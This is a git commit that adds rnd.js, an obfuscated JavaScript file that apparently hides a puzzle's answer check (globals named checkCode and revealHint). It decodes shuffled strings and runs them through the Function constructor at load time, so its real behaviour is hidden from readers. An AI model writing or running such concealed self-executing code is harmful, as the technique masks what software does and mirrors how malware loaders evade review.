fb03f1d7f34092a7717d24632a52b69bac53ebbf
Aviral Srivastava <72144346+godofgeeks23@users.noreply.github.com>
2024-10-16 23:29:06 +0530

    Create rnd.js

---
+++ rnd.js
@@ -0,0 +1,89 @@
+function i(h, J) {
+  var B = H();
+  return (
+    (i = function (Z, c) {
+      Z = Z - 0x1ef;
+      var S = B[Z];
+      return S;
+    }),
+    i(h, J)
+  );
+}
+(function (h, J) {
+  var l = i,
+    B = h();
+  while (!![]) {
+    try {
+      var Z =
+        -parseInt(l(0x1fb)) / 0x1 +
+        -parseInt(l(0x1f0)) / 0x2 +
+        parseInt(l(0x1f1)) / 0x3 +
+        (parseInt(l(0x1f9)) / 0x4) * (-parseInt(l(0x1fa)) / 0x5) +
+        (-parseInt(l(0x1fe)) / 0x6) * (parseInt(l(0x1f6)) / 0x7) +
+        -parseInt(l(0x1f2)) / 0x8 +
+        (parseInt(l(0x1f7)) / 0x9) * (parseInt(l(0x1fd)) / 0xa);
+      if (Z === J) break;
+      else B["push"](B["shift"]());
+    } catch (c) {
+      B["push"](B["shift"]());
+    }
+  }
+})(H, 0xa1dca);
+var a1, a2, a3, a4, a5, checkCode, revealHint;
+(function () {
+  var L = i,
+    h = "",
+    J = 0x2ec - 0x2e1;
+  function B(G) {
+    var D = i,
+      s = 0x225376,
+      v = G[D(0x1ff)],
+      Q = [];
+    for (var d = 0x0; d < v; d++) {
+      Q[d] = G[D(0x1f5)](d);
+    }
+    for (var d = 0x0; d < v; d++) {
+      var z = s * (d + 0x5b) + (s % 0x46f6),
+        b = s * (d + 0x2c9) + (s % 0x3a3c),
+        K = z % v,
+        O = b % v,
+        V = Q[K];
+      (Q[K] = Q[O]), (Q[O] = V), (s = (z + b) % 0x593f43);
+    }
+    return Q[D(0x1f3)]("");
+  }
+  var Z = B(L(0x1ef))[L(0x1f8)](0x0, J),
+    c = L(0x1fc),
+    S = B[Z],
+    p = "",
+    X = S,
+    N = S(p, B(c)),
+    P = N(B(L(0x1f4))),
+    R = X(h, P);
+  return R(0x2131), 0x18b0;
+})();
+function H() {
+  var e = [
+    "7TmgHgC",
+    "36QZLgnw",
+    "substr",
+    "1537484RFtbOk",
+    "15MqIaHT",
+    "463184CEnfOW",
+    "vas\x20==}0o8a3i,7rgs;;oa;o0;ab=d}f[;\x22nqr1=apsrssrv=\x20y=+0;nu\x20e=67c714s)+)r9oxeuoq\x20s[=rru71pg5t)fe.8;ltsr2)7v(nSjad,nlqa[b]4-(\x200nllf(rrf\x20i(,e]oiv;tp(o\x208qtqtr;[=s{Ar+[ut1=rr{};7;h,+a]0pd=(3;=+=+0=m+;C7.obpn=f.)hpl{c{n920t=nvt6<ln2t)j)A=lqvot(()9+gn>en.0scn}q.\x20ht(var),,0rfv,re)8vgl;.atda[;o+m0oe4-;,f(<v.=)ur)=v(C\x20s=hS,atrac\x20j=au[i)\x22!.,gahuvn+vdun8!1ffsvu3pv;=;]\x22(c8\x20mn{)(;\x22<v;(+pga)h+\x20ihzr2vat]rdj);(hnhv{raj(yrp;n;f+=){9(et71e*ta6vqvmreodlatf\x2281--95\x20==\x20.aut}ersg\x20rfh](=l0uovh\x20,q..efgfr].6nhcy8=nvdtA2-e,v)v(\x22.ef7jCcyg(,(hici-a;abgo;+;mr;);te\x20crnCiau2;l(\x20lia[o.=)l2=th6faot;t)r.a,,anfl+[e3t]v))rg.6c)a=.+}\x20r(l[hr+]=;(v)s1;e;Ajnl=r6a;c=(,,;<u0hrClvhufusoC};;i;,(s=\x20o>+e<==..va(aqiaq.]tx(.\x20pxh[0]9;ovubav]=,er)g(=+)\x20=r+\x20rg,0c,i4aoit\x22Ad31h6gw.gwe9nfruoahac\x20per;l+ognf)i(gr+aC)dqna6ui\x22osh*a,+,=;\x22gjn..ul=,mvv.i5r,8es]lirvie,(ibiiCr(g)rn79[;hw1r\x20;)1q[rm+itr)o;enf.em).;+rre);1h]s-uix(sh;=\x22kn,x[n(af2",
+    "8184850UvWomC",
+    "2635338VLtTyf",
+    "length",
+    "rbcesotdunfarkcrojuqgvhmnwpitslotyxcz",
+    "1741654NJpQmG",
+    "2425605jCOehU",
+    "3945136bsHREA",
+    "join",
+    "Hnn0!cit.EG&86$=eeH5HHHH)H(4n4]\x20$\x22or(oHHtd_H19.8a1>+{.i_0H.xfdH(HHc5(!4E5C#%}u58(f=9_H=th5=o#]))Lcc8{(He_x#(,%56fgevT=%\x272i.5(!t5)H)fH(6fitXH1cHEc9)KH)1N.3)jHHceHUd$tHh.(Ha$o7\x22puc3)Hso]k(;omfa($.z.dta6oAf5aH}6,t;f!orfHH4]tH5HpyNd)$)uH2(HfeH(H1]]3o\x226](00=]_s(n\x20.L]m}_V..HBuH=j.]$\x22,1)c4lp1f_H)i5Hb=tWhH4HaH)H.H;()zZ(.32%;)H;s1_K0,_6HH;%tubivs$H$Hif9a(o).rk_i(1edu!=I2))6%(4_)%o]H[oI.39boi.$p$+3dpr53<5H\x20_Hr]/5(ewHtM(em!H0scfHfe]bHf;riH\x22mu%30g[lr8e9a7eoHf}]_$e6\x20$}a1%aql}6H-\x20);r4HeO\x20eH\x20]6mHt.ft.!dolPd65]]Hg)t}ep&ff9,I(H(62n;,$r)g;a58tHK>H.oH(eH!UN.eHHu!91eH}sC{H=sro!\x20{}71H4}\x20!H4?cr.\x20).8x08.(lrHn_.9Hl6,o()c4nti)%HH+3\x20eorntfr\x20gUozH.2_9\x20l=Hre53.fHD6C-k8u(Q,h)),Tb;aHa9!;rG;]=2.HFnoLugH%lg5oilH_e)f_f)<lt\x203&s8]js:v7\x22oHt)$b(+ug8Hfsb.oWmFHf74erfH_={,((]0fe;nttH.$2u\x22p(:=0)erlHH!oq(gH_.v.2l=aHe7,.(0.8]_Sx3;#0tHfi\x20.l){:O)M(1{a7]r6]r\x20lf#7=0;u560H0zffH.pH6H)db3s2-.*8erQ)H_f%1.f4r?)bfH)a3de3,4p_r6$.$a14nf(4aa.HH;/=Hs*s};\x22,{H(_e(3,035hd_5)60..ri7jfc_.9pH6HtNHe,.1%0W#!et_n(j_N9353te\x226CYAa],H)=3o)h(xtlH)(;i.x$YcHf=H\x20}>56H_fHu147kt4)i.fGHe0p,rH61HHeTs?f/).]5F0Pfe%X-}7HC;3H9Ue[el4,hO.$H.H_La$a9\x22e%__h6))=8o5.v)HJo(je?n!n_n@QlJf0)oHtfp)(%+i0n\x27_2H0+rH!!$s]d5H];aJn.)}H)5H5;];gHn;KrHl=58H/7IHH\x275H>c.Hic3!B)t(\x20_1=!HHH4%-05?].T}])H0(HsH!_8=Heoaode$sn$l4tZ?pHiHf(6%\x20tH\x20p)=.5)sH1C.1H_7aH0])ri.a4]76s\x20l,=X5.\x20Hng}kHy28let)ohesseH_H!eoH=c_)o1e\x20H,SnfsH_o/\x22e8(3nHH.HI8Hr;{_H_({q!;s02$H(rl,j,V_uI\x20h7{\x20H{(3HH6t0tls+(H6f4@41n94_\x22%xl!5tfHnH,Hn2>7_,)e))=:oxus&s(};f\x2005(.eH(efr)(\x201KHsr).eoHsEL(HbH%9]icHl]#H}5i]Gi&o6\x20nf.!Ha78]a3HnHf5H,!o.ko,7i\x229))bHHh_.\x22=4HHe!a#)1(%(]on6HHCH.()$/rHs.H):{H\x20H7ts.(9d{)\x2034lHsH)%)}e6j)=nH8H#Hlb}uaO6u(r$HSH..S.]y[!%\x20IGqes\x20CSu(e$H()c(\x20HH8f.uHfH?Ha)%(ge(cf{]ED\x27Ho2HHf>$!8=)h\x20Hd(;.Y%12)6;eHH](H(zH4)H;B-,CHr!F},x6sHH6aH6H)r(jHC6..189}3i\x203;o]nHHB>oHo)H((fb64u#t.H(h73y;B.)Ht.e)HmH=b_dHt0eeHupo\x5ci5f45)]e\x20]H$C6.7;d/t)5f6#H;6.tH.bH66i.\x20hHio[.t=Pesbc2?2HN!6?14{2=a9HH{)dve0=nHs5)so;0tQe.4%e45rHnH+dt%=tn(3H[!e=_68H1f0!o_ohe%fnBDo.2;nt\x20o5H_.H.__69H=H\x20Ca{HeMw\x20cu(H1]o.H;er\x27t)p5n7rf_c.hUZ=\x20GHJiHHr_9%7\x20Sa6!,s]Y5%xS-*8f7nL!2HH)H_VfxHCH),)Hn=.\x5c8H{H#c\x22.Hg_HMn3r.]t8GvH(t,rH\x200,u.u]H.(H!{HH;H(:0_H=tio)He@1)\x20H+;.H0;n=k$Z\x20,6.2H]aHHuH1(;.0H61(DHu#_Ha1+:mH9.,f\x20,.HF$C!f]7y11(6o$nocT9H0ehissVhl5HPtH2o6O44H{sH;[H9lAHlmu.M3,e6e\x5cxM$[H3C_Hfnpk;)11ne\x20e]f\x22.s]e:2[r)tH!n$\x20faH)f_)=Hll4h8H91fH5HgsHHH8HfEuec.{_()uhn]H]]0e&_;=I7{Tea;.(o(HjrHHH;Hxc0r8!9p8(9@Iti{HHf4o;H\x20imf.l01fHpef;)upi!(E8lYatDH7)\x201&trHA$5H1WH)_H=_!$t!.eD[ef_ml._stofge)?h\x20(.f.9f,\x20e)_Hf_C#lH0i);ttHH)fHH]a.H)v*HHirf.H1\x20(/4r;$c{u5n3\x20adHs.)}b4l>_19rH5<2H(<N>9b32?3;P]t=)H\x20H.f;6C,H(3Che.Hi54!(H=>MH!fdl_60)9H(Hxt_6HH_jH.s(#ur003-3)6n3Hf8e)(5\x22]914{\x20at(_*28l,0.Hxl}stH.\x20neH}]t_Hn.$aCyc67Bcj+H0\x5c50\x20lH\x22):H.0e%f9x(.aoMyoci.4an]H)4SaHnsg1>Y1H}D)4H8)cH]),LH)(H883.5atH1r3UH{=(,etCeH9j,0HfHy{ctpc\x203s67g51\x20-fHrL0!HnHH!C]9.iH0Hf}\x20Vf$r+7",
+    "charAt",
+  ];
+  H = function () {
+    return e;
+  };
+  return H();
+}
